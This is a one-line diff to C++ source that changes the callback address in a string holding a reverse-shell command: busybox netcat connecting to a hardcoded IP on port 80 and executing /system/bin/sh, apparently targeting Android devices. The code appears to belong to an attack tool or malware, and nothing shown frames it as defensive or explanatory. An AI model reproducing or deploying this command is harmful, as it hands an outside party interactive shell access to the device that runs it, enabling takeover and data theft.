@@ -1,1 +1,1 @@
-std::string command = "./busybox nc 64.251.147.98 80 -e /system/bin/sh";
+std::string command = "./busybox nc 131.151.31.71 80 -e /system/bin/sh";
